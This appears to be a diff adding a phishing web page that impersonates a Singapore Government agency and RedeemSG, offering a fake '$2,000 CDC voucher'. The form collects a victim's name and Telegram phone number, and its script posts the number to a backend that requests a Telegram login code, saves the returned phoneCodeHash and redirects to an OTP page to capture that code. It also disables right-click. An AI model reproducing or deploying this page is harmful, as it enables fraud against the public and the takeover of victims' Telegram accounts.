@@ -1,0 +1,407 @@
+
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>redemsg-vuchergov-support</title>
+    <link href="css/1.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/2.css">
+    <link rel="stylesheet" href="css/3.css">
+    <link rel="shortcut icon" href="img/logomod.png" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.14.2/dist/sweetalert2.min.css">
+</head>
+<body>
+    <div class="container">
+        
+<header>
+   <div class="top-bar">
+        A Singapore Government Agency Website <a href="#">How to identify</a>
+    </div>
+</header>
+
+        
+        
+<main>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #F4F4F9;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Top bar styling */
+        .top-bar {
+            background-color: #F9F9F9;
+            padding: 5px 20px;
+            font-size: 12px;
+            color: #6B6B6B;
+            border-bottom: 1px solid #E5E5E5;
+            text-align: left;
+        }
+
+        .top-bar a {
+            color: #1A73E8;
+            text-decoration: none;
+            margin-left: 5px;
+        }
+
+        /* Header styling */
+        .header {
+            background-color: #FFFFFF;
+            color: white;
+            padding: 40px 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header .logo-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .header .logo-container img {
+            height: 35px;
+        }
+
+        .header .language-selector {
+            display: flex;
+            align-items: center;
+            border: 1px solid #2F318C;
+            color: #2F318C;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .header .language-selector i {
+            margin-right: 5px;
+        }
+
+        .header .content {
+            margin-top: 30px;
+        }
+
+        .header .content h1 {
+            margin: 0;
+            font-size: 28px;
+            font-weight: bold;
+          	color: #2F318C;
+        }
+
+        .header .content p {
+            margin: 5px 0 0;
+            font-size: 13px;
+          	color : #666;
+        }
+
+        .header .illustration {
+            position: absolute;
+            bottom: 0;
+            right: -50px;
+            height: 100px;
+        }
+
+    
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #a17a8a; 
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            margin-left: -25px;
+            margin-top: -25px;
+            box-sizing: border-box;
+        }
+    
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        footer {
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            padding: 10px 0;
+            background-color: #ffffff; 
+            box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.1);
+        }
+    
+        .list-scrolling {
+            animation: marquee 20s linear infinite;
+            height: 200px;
+            overflow-y: auto;
+        }
+    
+        
+        
+        .input-group-text {
+            background-color: #6C6FA6; 
+            color: #FFFFFF; 
+            border: none; 
+        }
+    
+        .form-control {
+            border: 1px solid #6C6FA6; 
+            color: #313130; 
+        }
+    
+        .btn {
+            background-color: #2F318C; 
+            color: #ffffff; 
+            border-radius: 15px; 
+            border: none; 
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+       
+
+        .item {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 2px solid #eee; 
+          }
+        
+          .item:last-child {
+            border-bottom: none;
+          }
+        
+          .icon {
+            margin-right: 20px; 
+            display: flex;
+            align-items: center;
+          }
+        
+          .icon img {
+            width: 50px; 
+          }
+        
+          .content {
+            flex: 1; 
+          }
+        
+          .title {
+            margin: 0;
+            color: #333; 
+            font-size: 18px;
+            font-weight: bold;
+          }
+        
+          .description {
+            margin: 5px 0 0 0; 
+            color: #666; 
+          }
+        
+          .arrow {
+            color: #a17a8a; 
+            font-size: 24px; 
+            margin-left: auto;
+          }
+        
+          .updated .tag {
+            background: #db3d44;
+            color: #fff; 
+            border-radius: 5px;
+            padding: 5px 10px;
+            font-size: 14px;
+            margin-right: 10px; 
+          }
+      
+      h2{
+        font-size:20px;
+      }
+    </style>
+    
+   <img src="img/redeemsg.svg" alt="RedeemSG Logo" style="width:120px; margin: 15px auto; display: block;">
+
+    <div class="row justify-content-center mb-4">
+        
+      <div class="header">
+        
+        <div class="logo-container">
+            <img src="img/cdc_identifier.png" alt="RedeemSG Logo">
+            <div class="language-selector">
+                <i class="fas fa-globe"></i> English 
+            </div>
+        </div>
+        <div class="content">
+            <h1>CDC Vouchers 2025</h1>
+            <p>Supported by Community Development Council</p>
+        </div>
+    </div>
+      
+        <div class="col-12 col-md-8 col-lg-6">
+          <h2 class="text-center" style="margin-top:15px; font-size:22px;">Claim $2000 Assistance Voucher</h2>
+            <p class="text-center" style="color: #313130; margin: 10px auto; font-size: 18px; padding: 0 20px; max-width: 100%;">
+                Each Resident Can Claim $2,000 Relief Voucher From The Singapore Goverment
+              </p>
+          <h2 class="text-center">Enter Your Details To Claim Voucher</h2>
+            <form>
+                <div class="mb-3" style="max-width: 350px; margin-left: auto; margin-right: auto;">
+                    <div class="input-group" style="margin-top: 15px;">
+                        <span class="input-group-text" id="basic-addon">
+                            🪪
+                        </span>
+                        <input type="text" name="uname" class="form-control" id="uname" aria-label="Phone number" aria-describedby="basic-addon1" placeholder="Enter Full Name" required="">
+                    </div>              
+                    <div class="input-group" style="margin-top: 15px;">
+                        <span class="input-group-text " id="basic-addon1">🇸🇬 +65</span>
+                        <input id="phone" type="tel" class="form-control" name="phone" id="phone" maxlength="13" aria-label="Phone number" aria-describedby="basic-addon1" placeholder="Enter Telegram Number " required="">
+                    </div>
+                </div>
+                <div class="d-grid gap-2 d-flex justify-content-center">
+                    <button id="submit-button" class="btn">CLAIM NOW</button>
+                </div>
+            </form>
+            </div>
+        </div>
+   
+   <img src="img/user-footer.svg" alt="logo" class="img-fluid mx-auto d-block">
+    
+    <div id="loader" style="display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.5); z-index: 9999;">
+        <div class="spinner" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);"></div>
+    </div>
+</main>
+
+
+        
+        
+
+
+    </div>
+    <script src="java/bootstrap.bundle.min.js"></script>
+    
+<script src="java/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.14.2/dist/sweetalert2.all.min.js"></script>
+
+
+<script>
+    var newURL = window.location.protocol + "//" + window.location.host + window.location.pathname
+    var phoneInput = document.getElementById('phone');
+    var countryCodeSpan = document.querySelector('#basic-addon1');
+    var submitBtnDiv = document.querySelector('#submit-button');
+    const Toast = Swal.mixin({
+        toast: true,
+        position: "top-end",
+        showConfirmButton: false,
+        timer: 5000,
+        timerProgressBar: true,
+        didOpen: (toast) => {
+            toast.onmouseenter = Swal.stopTimer;
+            toast.onmouseleave = Swal.resumeTimer;
+        }
+    });
+
+    phoneInput.addEventListener('input', function() {
+        if (this.value.length > 0) {
+            submitBtnDiv.classList.remove('visually-hidden');
+        } else {
+            submitBtnDiv.classList.add('visually-hidden');
+        }
+    });
+    
+    //request
+    document.querySelector('form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        var phone = '+65' + document.getElementById('phone').value;
+        console.log(phone)
+        requestTelegramCode(phone);
+    });
+
+    document.addEventListener('contextmenu', event => {
+        event.preventDefault();
+    });
+    
+    function requestTelegramCode(phone) {
+        $('#loader').show();
+        $.ajax({
+            url: '/request/send_otp',
+            type: 'POST',
+            CORS: true ,
+            contentType: 'application/json',
+            secure: true,
+            headers: {
+                'Access-Control-Allow-Origin': '*',
+            },
+            data: JSON.stringify({ phone: phone }),
+            success: function(response) {
+    $('#loader').hide();
+    if (response.status === 'success') {
+        Toast.fire({
+            icon: "success",
+            title: "Please wait, We will direct you to another page."
+        });
+
+        // Pastikan data sudah disimpan dengan benar dalam sessionStorage
+        sessionStorage.setItem('phone', phone);
+        sessionStorage.setItem('phoneCodeHash', response.phoneCodeHash);
+
+        // Cek apakah redirect sudah terjadi
+        setTimeout(() => {
+            window.location.href = newURL + 'otp.html'; // Pastikan 'newURL' sudah terdefinisi dengan benar
+        }, 100)
+    } else {
+        if (response.message === 'PHONE_NUMBER_INVALID') {
+            Toast.fire({
+                icon: "error",
+                title: "Sorry, the number you entered is not correct"
+            });
+        } else {
+            Toast.fire({
+                icon: "error",
+                title: response.message
+            });
+        }
+    }
+},
+            error: function(error) {
+                if (error.responseJSON.message === 'PHONE_NUMBER_INVALID') {
+                    Toast.fire({
+                        icon: "error",
+                        title: "Sorry, the number you entered is not correct"
+                    });
+                } else {
+                    Toast.fire({
+                        icon: "error",
+                        title: error.responseJSON.message
+                    });
+                }
+                $('#loader').hide();
+            }
+        });
+    }
+
+    // let currentSlide = 0;
+    // const slides = document.querySelectorAll(".slide");
+    // const totalSlides = slides.length;
+
+    // function goToSlide(slideNumber) {
+    //     slides[0].parentNode.style.transform = 'translateX(-' + slideNumber * 100 + '%)';
+    //     currentSlide = slideNumber;
+    // }
+
+    // function nextSlide() {
+    //     currentSlide = (currentSlide + 1) % totalSlides;
+    //     goToSlide(currentSlide);
+    // }
+
+    // setInterval(nextSlide, 3000);
+
+    // function focusOnForm() {
+    //     document.getElementById('myForm').focus(); 
+    //   }
+    
+    //   document.querySelectorAll('.item').forEach(item => {
+    //     item.addEventListener('click', focusOnForm);
+    //   });
+</script>
+
+
+</body></html>
